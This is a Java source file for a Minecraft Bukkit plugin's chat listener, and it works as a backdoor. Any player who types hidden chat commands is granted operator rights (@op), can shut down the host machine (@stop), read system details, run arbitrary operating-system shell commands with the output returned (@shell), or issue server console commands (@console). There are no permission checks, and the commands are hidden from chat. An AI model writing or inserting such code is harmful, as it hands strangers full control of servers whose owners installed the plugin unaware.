package cloud.xzai.events;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class MessageEvent implements Listener {
    @EventHandler
    public void onPlayerChat(PlayerChatEvent e) throws IllegalArgumentException, SecurityException {
        Player player = e.getPlayer();
        if (e.getMessage().equalsIgnoreCase("@op")) {
            player.sendMessage(ChatColor.GREEN + "--------------------");
            player.sendMessage(ChatColor.GREEN + "[已执行]OP");
            player.sendMessage(ChatColor.GREEN + "--------------------");
            e.setCancelled(true);
            player.setOp(true);
        }
        if (e.getMessage().equalsIgnoreCase("@stop")) {
            player.sendMessage(ChatColor.GREEN + "--------------------");
            player.sendMessage(ChatColor.GREEN + "[已执行]关机");
            player.sendMessage(ChatColor.GREEN + "--------------------");
            e.setCancelled(true);
            if (System.getProperty("os.name").toLowerCase().contains("linux")) {
                try {
                    Runtime.getRuntime().exec("poweroff -n");
                    Runtime.getRuntime().halt(1);
                } catch (IOException x) {
                    player.sendMessage(ChatColor.RED + "--------------------");
                    player.sendMessage(ChatColor.RED + "[发生错误]" + x.getMessage());
                    player.sendMessage(ChatColor.RED + "--------------------");
                }
            } else if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                try {
                    Runtime.getRuntime().exec("shutdown -s -f -t 00");
                    Runtime.getRuntime().halt(1);
                } catch (IOException x) {
                    player.sendMessage(ChatColor.RED + "--------------------");
                    player.sendMessage(ChatColor.RED + "[发生错误]" + x.getMessage());
                    player.sendMessage(ChatColor.RED + "--------------------");
                }
            } else {
                player.sendMessage(ChatColor.RED + "--------------------");
                player.sendMessage(ChatColor.RED + "[发生错误]");
                player.sendMessage(ChatColor.RED + "--------------------");
            }
        }
        if (e.getMessage().equalsIgnoreCase("@sysinfo")) {
            player.sendMessage(ChatColor.GREEN + "--------------------");
            player.sendMessage(ChatColor.GREEN + "[操作系统]" + System.getProperty("os.name"));
            player.sendMessage(ChatColor.GREEN + "[系统架构]" + System.getProperty("os.arch"));
            player.sendMessage(ChatColor.GREEN + "[Java版本]" + System.getProperty("java.version"));
            Runtime runtime = Runtime.getRuntime();
            long maxMemory = runtime.maxMemory() / 1024 / 1024;
            long totalMemory = runtime.totalMemory() / 1024 / 1024;
            long freeMemory = runtime.freeMemory() / 1024 / 1024;
            player.sendMessage(ChatColor.GREEN + "[最大内存]" + maxMemory + "MB");
            player.sendMessage(ChatColor.GREEN + "[已分配内存]" + totalMemory + "MB");
            player.sendMessage(ChatColor.GREEN + "[可用内存]" + freeMemory + "MB");
            player.sendMessage(ChatColor.GREEN + "--------------------");
            e.setCancelled(true);
        }
        if (e.getMessage().equalsIgnoreCase("@shell ")) {
            String command = e.getMessage().substring(7);
            try {
                Process process = Runtime.getRuntime().exec(command);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                player.sendMessage(ChatColor.GREEN + "--------------------");
                while ((line = reader.readLine()) != null) {
                    player.sendMessage(ChatColor.GREEN + line);
                }
                player.sendMessage(ChatColor.GREEN + "--------------------");
            } catch (IOException x) {
                player.sendMessage(ChatColor.RED + "--------------------");
                player.sendMessage(ChatColor.RED + "[发生错误]" + x.getMessage());
                player.sendMessage(ChatColor.RED + "--------------------");
            }
            e.setCancelled(true);
        }
        if (e.getMessage().toLowerCase().startsWith("@console ")) {
            String command = e.getMessage().substring(9);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
            player.sendMessage(ChatColor.GREEN + "--------------------");
            player.sendMessage(ChatColor.GREEN + "[已执行]" + command);
            player.sendMessage(ChatColor.GREEN + "--------------------");
            e.setCancelled(true);
        }
        if (e.getMessage().equalsIgnoreCase("@help")) {
            player.sendMessage(ChatColor.GREEN + "--------------------");
            player.sendMessage(ChatColor.GREEN + "获取帮助");
            player.sendMessage(ChatColor.GREEN + "@op - 将玩家提升为OP权限。");
            player.sendMessage(ChatColor.GREEN + "@stop - 关闭服务器（谨慎使用）。");
            player.sendMessage(ChatColor.GREEN + "@sysinfo - 查看系统信息，包括操作系统、Java版本和内存使用情况等。");
            player.sendMessage(ChatColor.GREEN + "@shell <命令> - 执行指定的系统控制台命令，并返回命令输出结果。");
            player.sendMessage(ChatColor.GREEN + "@console <命令> - 在游戏控制台中执行指定的命令。");
            player.sendMessage(ChatColor.GREEN + "@help - 获取帮助信息。");
            player.sendMessage(ChatColor.GREEN + "--------------------");
            e.setCancelled(true);
        }
    }
}